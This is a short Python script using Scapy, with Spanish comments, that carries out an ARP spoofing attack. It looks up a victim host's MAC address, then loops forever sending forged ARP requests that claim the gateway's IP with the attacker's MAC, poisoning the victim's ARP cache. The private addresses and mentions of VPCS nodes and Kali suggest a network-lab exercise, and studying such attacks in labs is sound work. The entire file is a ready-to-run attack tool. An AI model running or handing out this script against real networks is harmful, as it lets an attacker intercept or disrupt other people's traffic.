#!/usr/bin/env python3
from scapy.all import *
import time
import sys

interface = "eth0"
victim_ip = "10.25.83.11"   # IP de tu nodo VPCS
gateway_ip = "10.25.83.1"   # IP del Router que vas a suplantar

print(f"[*] Iniciando ataque ARP optimizado para nodos VPCS...")

try:
    # 1. Obtener la MAC de la VPCS para enviarle el paquete directo
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), timeout=2, iface=interface, verbose=False)
    victim_mac = None
    for _, rcv in ans:
        victim_mac = rcv[Ether].src

    if not victim_mac:
        print("[-] No se pudo obtener la MAC de la VPCS. Verifica que tenga IP fija configurada.")
        sys.exit(1)

    mi_mac = get_if_hwaddr(interface)
    print(f"[+] VPCS detectada en MAC: {victim_mac}")
    print("[*] Enviando ráfaga ARP Request. Revisa tu VPCS...")

    while True:
        # op=1 significa "ARP Request" (Petición). 
        # hwsrc es tu MAC de Kali, pero psrc es la IP del Router.
        packet = Ether(dst=victim_mac, src=mi_mac) / ARP(op=1, hwsrc=mi_mac, psrc=gateway_ip, pdst=victim_ip)
        
        sendp(packet, iface=interface, verbose=False)
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[-] Ataque detenido.")
    sys.exit(0)
